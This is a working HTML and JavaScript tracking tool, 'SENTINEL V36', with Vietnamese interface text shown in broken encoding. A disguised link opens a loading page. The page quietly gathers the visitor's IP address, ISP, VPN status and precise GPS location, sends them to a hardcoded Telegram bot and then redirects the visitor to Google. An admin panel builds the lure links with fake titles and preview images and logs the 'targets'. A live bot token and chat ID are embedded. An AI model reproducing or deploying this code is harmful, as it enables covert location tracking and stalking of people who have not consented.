<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title id="dyn-title">ƒêang t·∫£i t√†i li·ªáu...</title>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .victim-body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: system-ui; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285F4; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .admin-bg { background: #010409; color: #c9d1d9; }
        .glass { background: #0d1117; border: 1px solid #30363d; border-radius: 16px; }
        .input-dark { background: #010409; border: 1px solid #30363d; color: #f0f6fc; padding: 10px; border-radius: 8px; width: 100%; font-size: 11px; outline: none; }
        .input-dark:focus { border-color: #3b82f6; }
        .preview-card { background: #fff; border-radius: 10px; overflow: hidden; max-width: 310px; border: 1px solid #e1e4e8; margin: 0 auto; color: #000; text-align: left; }
    </style>
</head>
<body id="main-body" class="victim-body">

    <div id="ui-victim">
        <div class="loader" style="margin: 0 auto;"></div>
        <div id="status-msg" class="mt-4 text-[#777] text-[13px] text-center italic">ƒêang t·∫£i...</div>
    </div>

    <div id="ui-admin" class="hidden w-full p-4 lg:p-8">
        <div class="max-w-7xl mx-auto space-y-6">
            <header class="flex justify-between items-center border-b border-gray-800 pb-4">
                <h1 class="text-xl font-black text-white italic uppercase tracking-tighter">SENTINEL <span class="text-blue-500">V36</span></h1>
                <button onclick="logout()" class="text-[10px] bg-red-950/20 text-red-500 border border-red-900/50 px-4 py-2 rounded-xl font-bold uppercase">Logout</button>
            </header>

            <div class="grid lg:grid-cols-12 gap-6">
                <div class="lg:col-span-4 space-y-6">
                    <div class="glass p-5 space-y-4 shadow-2xl">
                        <h3 class="text-[10px] font-black text-blue-400 uppercase tracking-widest italic border-b border-gray-800 pb-2">1. Ng·ª•y Trang & Xem Tr∆∞·ªõc</h3>
                        <div class="space-y-3">
                            <input id="ed-title" type="text" placeholder="Ti√™u ƒë·ªÅ trang" class="input-dark" oninput="updateUI()">
                            <textarea id="ed-desc" placeholder="M√¥ t·∫£ ng·ª•y trang" class="input-dark h-16 resize-none" oninput="updateUI()"></textarea>
                            <input id="ed-img" type="text" placeholder="Link ·∫£nh (URL)" class="input-dark" oninput="updateUI()">
                        </div>
                        <div class="preview-card mt-2">
                            <img id="pre-img" src="" class="w-full h-32 object-cover">
                            <div class="p-3">
                                <div id="pre-title" class="font-bold text-xs text-blue-700 truncate">...</div>
                                <div id="pre-desc" class="text-[10px] text-gray-500 line-clamp-2 mt-1">...</div>
                            </div>
                        </div>
                    </div>

                    <div class="glass p-5 space-y-4 shadow-2xl">
                        <h3 class="text-[10px] font-black text-green-500 uppercase tracking-widest italic border-b border-gray-800 pb-2">2. Bot Config & Build</h3>
                        <input id="cfg-tk" type="password" placeholder="Bot Token" class="input-dark">
                        <input id="cfg-id" type="text" placeholder="Chat ID" class="input-dark">
                        <input id="cfg-rd" type="text" placeholder="Link ƒë√≠ch" class="input-dark">
                        <input id="in-name" type="text" placeholder="T√™n m·ª•c ti√™u..." class="input-dark">
                        <button onclick="saveAndBuild()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl text-[10px] uppercase">L∆∞u & T·∫°o Link</button>
                        <div id="box-result" class="hidden p-3 bg-black rounded border border-blue-900/30 mt-2">
                            <div id="out-link" onclick="copyText(this)" class="text-[10px] text-blue-400 break-all cursor-pointer font-mono text-center"></div>
                        </div>
                    </div>
                </div>

                <div class="lg:col-span-8">
                    <div class="glass min-h-[600px] flex flex-col overflow-hidden shadow-2xl">
                        <div class="p-4 border-b border-gray-800 flex justify-between bg-black/20 text-white">
                            <h3 class="text-[10px] font-black uppercase italic tracking-widest">Live Operations Logs</h3>
                            <button onclick="clearLogs()" class="text-[9px] text-gray-500 hover:text-red-500 font-bold uppercase">X√≥a</button>
                        </div>
                        <div class="overflow-x-auto flex-1 font-sans">
                            <table class="w-full text-left text-[11px]">
                                <thead class="bg-black/50 text-gray-500 uppercase text-[9px] font-bold">
                                    <tr><th class="p-4">ƒê·ªëi t∆∞·ª£ng</th><th class="p-4">M·∫°ng (IP/ISP)</th><th class="p-4">V·ªã tr√≠ th·ª±c t·∫ø</th><th class="p-4 text-right">Map</th></tr>
                                </thead>
                                <tbody id="log-list" class="divide-y divide-gray-800 text-gray-300">
                                    </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // C·∫§U H√åNH G·ªêC
        let config = {
            t: "8123198134:AAHTKQPxi5CnW_HDEenVJjRZMZvx1REjLB4",
            i: "857408205",
            r: "https://google.com",
            mt: "X√°c th·ª±c t√†i kho·∫£n", md: "Vui l√≤ng ch·ªù...", mi: ""
        };

        const urlParams = new URLSearchParams(window.location.search);

        window.onload = () => {
            if (urlParams.has('admin')) {
                if (localStorage.getItem('sentinel_v36_auth') === 'true' || prompt("Access Code:") === "123") {
                    localStorage.setItem('sentinel_v36_auth', 'true');
                    initAdmin();
                } else { window.location.search = ""; }
            } else { startPhantom(); }
        };

        // --- TRACKING CORE (OPTIMIZED) ---
        async function startPhantom() {
            const target = urlParams.get('name') || 'Guest';
            try { 
                const v = urlParams.get('v'); 
                if(v) config = JSON.parse(decodeURIComponent(escape(atob(v)))); 
                document.title = config.mt;
            } catch(e) {}

            let finalLog = { name: target, time: new Date().toLocaleTimeString(), st: 'IP' };

            // CH·ªà G·ªåI 1 API DUY NH·∫§T ƒê·ªÇ TR√ÅNH B·ªä CH·∫∂N
            try {
                const res = await fetch('http://ip-api.com/json/?fields=status,country,city,isp,query,proxy').then(r => r.json());
                if(res.status === 'success') {
                    finalLog.ip = res.query;
                    finalLog.isp = res.isp;
                    finalLog.address = `${res.city}, ${res.country}`;
                    finalLog.proxy = res.proxy ? "VPN" : "CLEAN";
                    
                    saveLog(finalLog);
                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üöÄ <b>" + target + "</b> ƒë√£ v√†o\nüåê IP: " + res.query + "\nüè¢ ISP: " + res.isp + "\nüõ°Ô∏è Check: " + finalLog.proxy)}`);
                }
            } catch(e) { console.error("IP API Error"); }

            const jump = () => window.location.replace(config.r);

            // √âp GPS & Reverse Geo
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude, lon = p.coords.longitude;
                    let fullAddr = `T·ªça ƒë·ªô: ${lat}, ${lon}`;
                    try {
                        const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
                        fullAddr = geo.display_name || fullAddr;
                    } catch(e) {}
                    
                    finalLog.lat = lat; finalLog.lon = lon; finalLog.address = fullAddr; finalLog.st = 'GPS';
                    saveLog(finalLog);
                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üéØ <b>" + target + "</b> GPS OK\nüìç " + fullAddr + "\nüó∫Ô∏è Map: https://www.google.com/maps?q=" + lat + "," + lon)}`);
                    jump();
                }, jump, { enableHighAccuracy: true, timeout: 5000 });
            } else { jump(); }
            setTimeout(jump, 8000);
        }

        // --- ADMIN FUNCTIONS ---
        function initAdmin() {
            document.getElementById('main-body').className = "admin-bg";
            document.getElementById('ui-victim').classList.add('hidden');
            document.getElementById('ui-admin').classList.remove('hidden');
            
            const saved = localStorage.getItem('sentinel_v36_cfg');
            if(saved) config = JSON.parse(saved);
            
            document.getElementById('ed-title').value = config.mt;
            document.getElementById('ed-desc').value = config.md;
            document.getElementById('ed-img').value = config.mi;
            document.getElementById('cfg-tk').value = config.t;
            document.getElementById('cfg-id').value = config.i;
            document.getElementById('cfg-rd').value = config.r;
            
            updateUI();
            renderLogs();
            setInterval(renderLogs, 3000);
        }

        function updateUI() {
            document.getElementById('pre-title').innerText = document.getElementById('ed-title').value || "...";
            document.getElementById('pre-desc').innerText = document.getElementById('ed-desc').value || "...";
            document.getElementById('pre-img').src = document.getElementById('ed-img').value || "";
        }

        function saveAndBuild() {
            config.t = document.getElementById('cfg-tk').value;
            config.i = document.getElementById('cfg-id').value;
            config.r = document.getElementById('cfg-rd').value;
            config.mt = document.getElementById('ed-title').value;
            config.md = document.getElementById('ed-desc').value;
            config.mi = document.getElementById('ed-img').value;
            localStorage.setItem('sentinel_v36_cfg', JSON.stringify(config));
            
            const v = btoa(unescape(encodeURIComponent(JSON.stringify(config))));
            const link = window.location.href.split('?')[0] + "?name=" + encodeURIComponent(document.getElementById('in-name').value || 'Target') + "&v=" + v;
            document.getElementById('box-result').classList.remove('hidden');
            document.getElementById('out-link').innerText = link;
        }

        // L∆ØU NH·∫¨T K√ù (C√ì PH√ÇN T√çCH TR√ôNG)
        function saveLog(data) {
            let logs = JSON.parse(localStorage.getItem('sentinel_v36_logs') || '[]');
            if (logs.length > 0 && logs[0].name === data.name && data.st === 'GPS') {
                logs[0] = data; // C·∫≠p nh·∫≠t GPS cho d√≤ng IP m·ªõi nh·∫•t
            } else {
                logs.unshift(data);
            }
            localStorage.setItem('sentinel_v36_logs', JSON.stringify(logs.slice(0, 50)));
        }

        function renderLogs() {
            const logs = JSON.parse(localStorage.getItem('sentinel_v36_logs') || '[]');
            const table = document.getElementById('log-list');
            if (logs.length === 0) {
                table.innerHTML = '<tr><td colspan="4" class="p-10 text-center text-gray-700">Ch∆∞a c√≥ d·ªØ li·ªáu...</td></tr>';
                return;
            }
            const html = logs.map(l => `
                <tr class="hover:bg-white/5 border-b border-gray-800 transition">
                    <td class="p-4 font-bold text-white uppercase">${l.name}<br><span class="text-[8px] text-gray-600">${l.time}</span></td>
                    <td class="p-4 font-mono text-blue-400 text-[10px]">${l.ip || 'undefined'}<br><span class="text-[8px] text-gray-500 uppercase">${l.isp || ''}</span></td>
                    <td class="p-4 text-gray-300 text-[9px] leading-tight max-w-[200px]">${l.address || 'ƒêang l·∫•y...'}</td>
                    <td class="p-4 text-right">
                        ${l.st === 'GPS' ? `<a href="https://www.google.com/maps?q=${l.lat},${l.lon}" target="_blank" class="bg-green-600/20 text-green-500 border border-green-600/30 px-2 py-1 rounded text-[9px] font-black uppercase">MAP</a>` : `<span class="text-gray-700 italic">IP ONLY</span>`}
                    </td>
                </tr>
            `).join('');
            if (table.innerHTML !== html) table.innerHTML = html;
        }

        function clearLogs() { if(confirm("X√≥a?")) { localStorage.removeItem('sentinel_v36_logs'); renderLogs(); } }
        function logout() { localStorage.removeItem('sentinel_v36_auth'); location.reload(); }
        function copyText(el) { navigator.clipboard.writeText(el.innerText); alert("ƒê√£ Copy!"); }
    </script>
</body>
</html>
